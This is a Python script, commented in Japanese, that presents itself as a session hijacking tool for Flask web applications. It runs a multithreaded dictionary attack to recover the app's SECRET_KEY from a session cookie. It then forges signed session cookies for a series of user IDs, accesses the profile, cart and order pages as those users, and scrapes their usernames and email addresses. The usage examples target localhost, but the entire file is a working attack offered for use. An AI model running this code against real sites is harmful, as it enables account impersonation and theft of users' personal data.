#!/usr/bin/env python3
"""
セッションハイジャックツール
指定したWEBサーバーに対してセッションハイジャックを実行し、
SECRET_KEYを辞書攻撃で見つけます。
"""

import requests
import json
import re
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False


class SessionHijacker:
    def __init__(self, target_url, wordlist_path=None):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.wordlist_path = wordlist_path
        self.found_secret_key = None
        
    def load_wordlist(self, wordlist_path):
        """辞書ファイルを読み込む"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] 辞書ファイルが見つかりません: {wordlist_path}")
            return []
        except Exception as e:
            print(f"[!] 辞書ファイルの読み込みエラー: {e}")
            return []
    
    def get_default_wordlist(self):
        """デフォルトのSECRET_KEY候補リスト"""
        return [
            "secret",
            "SECRET",
            "secretkey",
            "SECRET_KEY",
            "flask-secret-key",
            "django-secret-key",
            "development-secret-key",
            "production-secret-key",
            "changeme",
            "change-me",
            "default-secret-key",
            "your-secret-key-here",
            "1234567890",
            "abcdefghijklmnopqrstuvwxyz",
            "admin",
            "password",
            "root",
            "test",
            "testing",
            "dev",
            "development",
            "prod",
            "production",
            "key",
            "secret123",
            "mysecretkey",
            "supersecret",
            "verysecret",
            "dev-secret-key",
            "ultrasecret",
        ]
    
    def get_session_cookie(self, url):
        """セッションクッキーを取得"""
        try:
            response = self.session.get(url, timeout=10)
            cookies = self.session.cookies
            
            # Flaskのセッションクッキー（通常は'session'という名前）
            session_cookies = {}
            for cookie in cookies:
                if 'session' in cookie.name.lower():
                    session_cookies[cookie.name] = cookie.value
            
            if not session_cookies:
                # すべてのクッキーを返す
                session_cookies = {cookie.name: cookie.value for cookie in cookies}
            
            return session_cookies, response
        except Exception as e:
            print(f"[!] セッションクッキーの取得エラー: {e}")
            return {}, None
    
    def decode_flask_session(self, session_cookie, secret_key):
        """Flaskのセッションクッキーを復号"""
        try:
            serializer = URLSafeTimedSerializer(secret_key)
            data = serializer.loads(session_cookie, max_age=None)
            return data
        except (BadSignature, SignatureExpired, Exception) as e:
            return None
    
    def encode_flask_session(self, data, secret_key):
        """Flaskのセッションクッキーをエンコード"""
        try:
            serializer = URLSafeTimedSerializer(secret_key)
            return serializer.dumps(data)
        except Exception as e:
            print(f"[!] セッションクッキーのエンコードエラー: {e}")
            return None
    
    def test_secret_key(self, secret_key, session_cookie):
        """SECRET_KEYが正しいかテスト"""
        decoded = self.decode_flask_session(session_cookie, secret_key)
        return decoded is not None
    
    def dictionary_attack(self, session_cookie, max_workers=10):
        """辞書攻撃でSECRET_KEYを見つける"""
        print(f"[*] SECRET_KEYの辞書攻撃を開始...")
        print(f"[*] テスト対象のセッションクッキー: {session_cookie[:50]}...")
        
        # 辞書リストを取得
        if self.wordlist_path:
            wordlist = self.load_wordlist(self.wordlist_path)
            if not wordlist:
                print("[!] 辞書ファイルが空です。デフォルトリストを使用します。")
                wordlist = self.get_default_wordlist()
        else:
            wordlist = self.get_default_wordlist()
        
        print(f"[*] {len(wordlist)}個の候補をテストします...")
        
        # マルチスレッドで辞書攻撃を実行
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(self.test_secret_key, key, session_cookie): key
                for key in wordlist
            }
            
            for future in as_completed(futures):
                key = futures[future]
                try:
                    if future.result():
                        self.found_secret_key = key
                        print(f"\n[+] SECRET_KEYが見つかりました: {key}")
                        return key
                except Exception as e:
                    continue
        
        print("\n[!] SECRET_KEYが見つかりませんでした。")
        return None
    
    def create_fake_session(self, secret_key, target_user_id):
        """偽造するセッションデータを作成"""
        fake_session = {
            "_user_id": str(target_user_id),
            "_fresh": True,
            "_id": str(target_user_id)
        }
        return fake_session
    
    def test_endpoint(self, session, base_url, endpoint):
        """エンドポイントにアクセスしてテスト"""
        url = f"{base_url}{endpoint}"
        try:
            response = session.get(url, timeout=10)
            print(f"ステータスコード: {response.status_code}")
            return response
        except Exception as e:
            print(f"[!] リクエストエラー: {e}")
            return None
    
    def extract_user_info(self, response_text):
        """プロファイルページからユーザー情報を抽出"""
        user_info = {}
        
        if not response_text:
            return user_info
        
        # 除外する不要なテキストとセクション
        exclude_texts = ['ログイン', 'Login', 'login', 'ログアウト', 'Logout', 'logout', 
                         '登録', 'Register', 'register', '検索', 'Search', 'search',
                         'ホーム', 'Home', 'home', 'カート', 'Cart', 'cart',
                         'プロフィール', 'Profile', 'profile', '注文', 'Order', 'order',
                         'viewport', 'charset', 'utf-8', 'width', 'height', 'content',
                         'お問い合わせ', '問い合わせ', 'Contact', 'contact', 'お問合せ']
        
        # 除外するメールアドレスのドメイン
        exclude_email_domains = ['info@', 'admin@', 'support@', 'contact@', 'noreply@', 
                                 'ecommerce.com', 'example.com']
        
        # BeautifulSoupが利用可能な場合はHTMLをパース
        if HAS_BS4:
            try:
                soup = BeautifulSoup(response_text, 'html.parser')
                
                # ナビゲーションやヘッダー、フッターを除外
                for tag in soup.find_all(['nav', 'header', 'footer']):
                    tag.decompose()
                
                # お問い合わせセクションを除外
                for section in soup.find_all(string=re.compile(r'お問い合わせ|問い合わせ|Contact', re.I)):
                    parent = section.find_parent()
                    if parent:
                        # 親要素全体を除外
                        for ancestor in parent.find_parents():
                            if ancestor:
                                ancestor.decompose()
                                break
                        parent.decompose()
                
                # 「基本情報」セクションを探す
                basic_info_section = None
                for text in soup.find_all(string=re.compile(r'基本情報', re.I)):
                    parent = text.find_parent()
                    if parent:
                        # セクション全体を取得（次のセクションまで）
                        basic_info_section = parent
                        break
                
                # 基本情報セクションが見つかった場合、その中から情報を抽出
                search_area = basic_info_section if basic_info_section else soup
                
                # Bootstrapクラス（row mb-3, col-md-6など）から情報を抽出
                # row mb-3クラスを持つ要素を探す
                row_elements = search_area.find_all(class_=re.compile(r'\brow\b.*?\bmb-3\b|\bmb-3\b.*?\brow\b', re.I))
                for row in row_elements:
                    # このrow内のcol-md-6などの列要素を探す
                    cols = row.find_all(class_=re.compile(r'\bcol-', re.I))
                    for col in cols:
                        text = col.get_text(strip=True)
                        # ラベルと値の形式を探す
                        if ':' in text or '：' in text:
                            parts = re.split(r'[:：]', text, 1)
                            if len(parts) == 2:
                                label = parts[0].strip()
                                value = parts[1].strip()
                                
                                if value and value not in exclude_texts and value != '-' and len(value) < 100:
                                    label_lower = label.lower()
                                    if ('ユーザー名' in label or 'username' in label_lower) and 'username' not in user_info:
                                        user_info['username'] = value
                                    elif ('メール' in label or 'email' in label_lower or 'メールアドレス' in label) and '@' in value:
                                        if 'email' not in user_info and not any(domain in value for domain in exclude_email_domains):
                                            user_info['email'] = value
                    
                    # row内の直接のテキストからも情報を抽出
                    row_text = row.get_text()
                    if 'ユーザー名' in row_text or 'Username' in row_text:
                        # ユーザー名の値を探す
                        username_match = re.search(r'ユーザー名[:\s]*([^\s<\-]+)|Username[:\s]*([^\s<\-]+)', row_text, re.I)
                        if username_match:
                            username = (username_match.group(1) or username_match.group(2)).strip()
                            if username and username not in exclude_texts and username != '-' and 'username' not in user_info:
                                user_info['username'] = username
                    
                    if 'メール' in row_text or 'Email' in row_text:
                        # メールアドレスの値を探す
                        email_match = re.search(r'メール[アドレス]*[:\s]*([^\s<\-]+@[^\s<\-]+)|Email[:\s]*([^\s<\-]+@[^\s<\-]+)', row_text, re.I)
                        if email_match:
                            email = (email_match.group(1) or email_match.group(2)).strip()
                            if email and '@' in email and 'email' not in user_info:
                                if not any(domain in email for domain in exclude_email_domains):
                                    user_info['email'] = email
                
                # col-md-6などの列要素から直接情報を抽出
                col_elements = search_area.find_all(class_=re.compile(r'\bcol-', re.I))
                for col in col_elements:
                    text = col.get_text(strip=True)
                    # ラベルと値の形式を探す
                    if ':' in text or '：' in text:
                        parts = re.split(r'[:：]', text, 1)
                        if len(parts) == 2:
                            label = parts[0].strip()
                            value = parts[1].strip()
                            
                            if value and value not in exclude_texts and value != '-' and len(value) < 100:
                                label_lower = label.lower()
                                if ('ユーザー名' in label or 'username' in label_lower) and 'username' not in user_info:
                                    user_info['username'] = value
                                elif ('メール' in label or 'email' in label_lower or 'メールアドレス' in label) and '@' in value:
                                    if 'email' not in user_info and not any(domain in value for domain in exclude_email_domains):
                                        user_info['email'] = value
                    
                    # ラベルと値が別の要素に分かれている場合
                    label_elem = col.find(string=re.compile(r'ユーザー名|Username', re.I))
                    if label_elem and 'username' not in user_info:
                        # ラベルの次の要素または親要素内の次のテキストを探す
                        parent = label_elem.find_parent()
                        if parent:
                            # 親要素内のテキスト全体から値を抽出
                            full_text = parent.get_text()
                            match = re.search(r'ユーザー名[:\s]*([^\s<\-]+)|Username[:\s]*([^\s<\-]+)', full_text, re.I)
                            if match:
                                username = (match.group(1) or match.group(2)).strip()
                                if username and username not in exclude_texts and username != '-':
                                    user_info['username'] = username
                            
                            # 次の兄弟要素を探す
                            next_sibling = parent.find_next_sibling()
                            if next_sibling:
                                value = next_sibling.get_text(strip=True)
                                if value and value not in exclude_texts and value != '-':
                                    user_info['username'] = value
                    
                    label_elem = col.find(string=re.compile(r'メール|Email', re.I))
                    if label_elem and 'email' not in user_info:
                        parent = label_elem.find_parent()
                        if parent:
                            # 親要素内のテキスト全体から値を抽出
                            full_text = parent.get_text()
                            match = re.search(r'メール[アドレス]*[:\s]*([^\s<\-]+@[^\s<\-]+)|Email[:\s]*([^\s<\-]+@[^\s<\-]+)', full_text, re.I)
                            if match:
                                email = (match.group(1) or match.group(2)).strip()
                                if email and '@' in email:
                                    if not any(domain in email for domain in exclude_email_domains):
                                        user_info['email'] = email
                            
                            # 次の兄弟要素を探す
                            next_sibling = parent.find_next_sibling()
                            if next_sibling:
                                value = next_sibling.get_text(strip=True)
                                if '@' in value and value not in exclude_texts:
                                    if not any(domain in value for domain in exclude_email_domains):
                                        user_info['email'] = value
                
                # ラベルと値のペアを探す（「ユーザー名:」「メールアドレス:」など）
                label_patterns = {
                    'username': [r'ユーザー名[:\s]*', r'Username[:\s]*'],
                    'email': [r'メールアドレス[:\s]*', r'Email[:\s]*', r'メール[:\s]*'],
                    'name': [r'名前[:\s]*', r'Name[:\s]*'],
                    'first_name': [r'名[:\s]*', r'First Name[:\s]*'],
                    'last_name': [r'姓[:\s]*', r'Last Name[:\s]*'],
                }
                
                for key, patterns in label_patterns.items():
                    for pattern in patterns:
                        # ラベルを探す
                        label_elem = search_area.find(string=re.compile(pattern, re.I))
                        if label_elem:
                            # ラベルの次の要素（値）を探す
                            parent = label_elem.find_parent()
                            if parent:
                                # 同じ親要素内の次のテキストノードまたは要素を探す
                                next_elem = parent.find_next_sibling()
                                if next_elem:
                                    value = next_elem.get_text(strip=True)
                                else:
                                    # 親要素内のテキストから値を抽出
                                    full_text = parent.get_text()
                                    match = re.search(pattern + r'([^\s<]+)', full_text, re.I)
                                    if match:
                                        value = match.group(1).strip()
                                    else:
                                        continue
                                
                                if value and value not in exclude_texts and value != '-':
                                    if key == 'email':
                                        # メールアドレスの検証
                                        if '@' in value and not any(domain in value for domain in exclude_email_domains):
                                            if 'email' not in user_info:
                                                user_info['email'] = value
                                    elif key == 'username':
                                        if len(value) < 100 and 'username' not in user_info:
                                            user_info['username'] = value
                                    elif key in ['name', 'first_name', 'last_name']:
                                        if len(value) < 100 and value != '-':
                                            if 'name' not in user_info:
                                                user_info['name'] = value
                                break
                        if key in user_info:
                            break
                
                # テーブルから情報を抽出（基本情報セクション内）
                tables = search_area.find_all('table')
                for table in tables:
                    rows = table.find_all('tr')
                    for row in rows:
                        cells = row.find_all(['td', 'th'])
                        if len(cells) >= 2:
                            label = cells[0].get_text(strip=True)
                            value = cells[1].get_text(strip=True)
                            
                            if value and value not in exclude_texts and value != '-' and len(value) < 100:
                                label_lower = label.lower()
                                if 'ユーザー名' in label or 'username' in label_lower:
                                    if 'username' not in user_info:
                                        user_info['username'] = value
                                elif ('メール' in label or 'email' in label_lower) and '@' in value:
                                    if 'email' not in user_info and not any(domain in value for domain in exclude_email_domains):
                                        user_info['email'] = value
                                elif '名前' in label or 'name' in label_lower:
                                    if 'name' not in user_info and value != '-':
                                        user_info['name'] = value
                
                # divやspanから情報を抽出（ラベル:値の形式）
                for elem in search_area.find_all(['div', 'span', 'p', 'li']):
                    text = elem.get_text(strip=True)
                    if ':' in text or '：' in text:
                        parts = re.split(r'[:：]', text, 1)
                        if len(parts) == 2:
                            label = parts[0].strip()
                            value = parts[1].strip()
                            
                            if value and value not in exclude_texts and value != '-' and len(value) < 100:
                                label_lower = label.lower()
                                if ('ユーザー名' in label or 'username' in label_lower) and 'username' not in user_info:
                                    user_info['username'] = value
                                elif ('メール' in label or 'email' in label_lower) and '@' in value:
                                    if 'email' not in user_info and not any(domain in value for domain in exclude_email_domains):
                                        user_info['email'] = value
                
                # メールアドレスを抽出（最後の手段、基本情報セクション内のみ）
                if 'email' not in user_info:
                    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                    section_text = search_area.get_text() if basic_info_section else response_text
                    all_emails = re.findall(email_pattern, section_text)
                    for email in all_emails:
                        if not any(domain in email for domain in exclude_email_domains):
                            user_info['email'] = email
                            break
                
            except Exception as e:
                pass
        
        # 正規表現で情報を抽出（BeautifulSoupが使えない場合や補完として）
        # 基本情報セクションを特定
        basic_info_match = re.search(r'基本情報.*?(?=配送先情報|お問い合わせ|$)', response_text, re.DOTALL | re.IGNORECASE)
        search_text = basic_info_match.group(0) if basic_info_match else response_text
        
        # お問い合わせセクションを除外
        search_text = re.sub(r'お問い合わせ.*?$', '', search_text, flags=re.DOTALL | re.IGNORECASE)
        
        # ユーザー名を抽出
        username_patterns = [
            r'ユーザー名[:\s]*([^\s<\-]+)',
            r'Username[:\s]*([^\s<\-]+)',
        ]
        for pattern in username_patterns:
            match = re.search(pattern, search_text, re.IGNORECASE)
            if match:
                username = match.group(1).strip()
                if username and username not in exclude_texts and username != '-' and len(username) < 100:
                    if 'username' not in user_info:
                        user_info['username'] = username
                        break
        
        # メールアドレスを抽出（基本情報セクション内のみ、除外ドメインを避ける）
        if 'email' not in user_info:
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, search_text)
            for email in emails:
                if not any(domain in email for domain in exclude_email_domains):
                    user_info['email'] = email
                    break
        
        return user_info
    
    def hijack_session(self, target_user_id=None, target_username=None, endpoints=None, max_user_ids=5):
        """セッションハイジャックを実行"""
        print(f"[*] ターゲットURL: {self.target_url}")
        
        # デフォルトのエンドポイントリスト
        if endpoints is None:
            endpoints = ['/profile', '/cart', '/orders']
        
        # ターゲットユーザーIDのリストを決定
        if target_user_id is None:
            # デフォルトで1から5までのIDを試す
            user_ids = [str(i) for i in range(1, max_user_ids + 1)]
            print(f"[*] 攻撃対象のユーザーID: {', '.join(user_ids)} (合計{len(user_ids)}個)")
        else:
            user_ids = [str(target_user_id)]
            print(f"[*] 攻撃対象のユーザーID: {target_user_id}")
        
        # セッションクッキーを取得（辞書攻撃用）
        print("[*] セッションクッキーを取得中...")
        session_cookies, response = self.get_session_cookie(self.target_url)
        
        secret_key = None
        
        # セッションクッキーが存在する場合は辞書攻撃を実行
        if session_cookies:
            print(f"[+] セッションクッキーを取得: {list(session_cookies.keys())}")
            cookie_name = list(session_cookies.keys())[0]
            session_cookie = session_cookies[cookie_name]
            
            # SECRET_KEYを辞書攻撃で見つける
            secret_key = self.dictionary_attack(session_cookie)
            
            if secret_key:
                # セッションクッキーを復号して確認
                print("[*] セッションクッキーを復号中...")
                session_data = self.decode_flask_session(session_cookie, secret_key)
                if session_data:
                    print(f"[+] セッションデータ: {json.dumps(session_data, indent=2, ensure_ascii=False)}")
        else:
            print("[!] セッションクッキーが見つかりませんでした。")
            print("[*] デフォルトのSECRET_KEYを使用してセッションを偽造します...")
            # デフォルトのSECRET_KEYを試す
            default_key = "dev-secret-key"
            secret_key = default_key
        
        if not secret_key:
            print("[!] SECRET_KEYが見つからないため、セッションハイジャックを続行できません。")
            return False
        
        print(f"[+] 使用するSECRET_KEY: {secret_key}")
        
        overall_success = False
        
        # 各ユーザーIDを試す
        for user_id in user_ids:
            print(f"\n{'='*60}")
            print(f"[*] ユーザーID {user_id} でセッションハイジャックを試行中...")
            print(f"{'='*60}")
            
            # 偽造するセッションデータを作成
            fake_session = self.create_fake_session(secret_key, user_id)
            print(f"[+] 偽造セッションデータ: {json.dumps(fake_session, indent=2, ensure_ascii=False)}")
            
            # セッションクッキーを生成
            fake_cookie = self.encode_flask_session(fake_session, secret_key)
            
            if not fake_cookie:
                print(f"[!] ユーザーID {user_id} のセッションクッキーの生成に失敗しました。")
                continue
            
            print(f"[*] 偽造したセッションクッキー: {fake_cookie}")
            
            # 偽造したセッションでアクセス
            hijacked_session = requests.Session()
            hijacked_session.cookies.set('session', fake_cookie)
            
            success_count = 0
            
            # 各エンドポイントにアクセス
            for endpoint in endpoints:
                print(f"\n[*] {endpoint}にアクセス...")
                response = self.test_endpoint(hijacked_session, self.target_url, endpoint)
                
                if response and response.status_code == 200:
                    print(f"[+] 攻撃成功: {endpoint}にアクセスできました")
                    if "プロフィール" in response.text or "profile" in response.text.lower() or endpoint == '/profile':
                        print(f"[+] ユーザーID {user_id} になりすましてアクセスできました")
                        # プロファイルページからユーザー情報を抽出
                        user_info = self.extract_user_info(response.text)
                        if user_info:
                            print(f"[+] ユーザーID {user_id} の抽出したユーザー情報:")
                            for key, value in user_info.items():
                                print(f"    {key}: {value}")
                    success_count += 1
                else:
                    print(f"[*] 攻撃失敗: {endpoint}への認証が必要です")
            
            # メインページにもアクセス
            print(f"\n[*] メインページにアクセス...")
            response = self.test_endpoint(hijacked_session, self.target_url, '')
            
            if response and response.status_code == 200:
                print(f"[+] ユーザーID {user_id} でセッションハイジャックが成功しました")
                overall_success = True
            elif success_count > 0:
                print(f"[+] ユーザーID {user_id}: {success_count}個のエンドポイントへのアクセスに成功しました")
                overall_success = True
        
        if overall_success:
            return True
        else:
            print("\n[*] すべてのユーザーIDでセッションハイジャックが失敗しました")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='WEBサーバーに対するセッションハイジャックツール',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py -u http://localhost:5000 --user-id 1
  python 001session_hijack.py -u http://localhost:5000 -w wordlist.txt
  python 001session_hijack.py -u http://localhost:5000 --endpoints /profile /cart /orders
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='ターゲットURL')
    parser.add_argument('-w', '--wordlist',
                       help='SECRET_KEYの辞書ファイルパス')
    parser.add_argument('--user-id',
                       help='ハイジャックするユーザーID（指定しない場合は1-5を試行）')
    parser.add_argument('--max-user-ids', type=int, default=5,
                       help='試行するユーザーIDの最大数（デフォルト: 5）')
    parser.add_argument('--endpoints', nargs='+',
                       default=['/profile', '/cart', '/orders'],
                       help='テストするエンドポイント（デフォルト: /profile /cart /orders）')
    parser.add_argument('--threads', type=int, default=10,
                       help='辞書攻撃のスレッド数（デフォルト: 10）')
    
    args = parser.parse_args()
    
    hijacker = SessionHijacker(args.url, args.wordlist)
    success = hijacker.hijack_session(
        target_user_id=args.user_id,
        endpoints=args.endpoints,
        max_user_ids=args.max_user_ids
    )
    
    if success:
        sys.exit(0)
    else:
        print("\n[*] セッションハイジャックに失敗しました。")
        sys.exit(1)


if __name__ == '__main__':
    main()

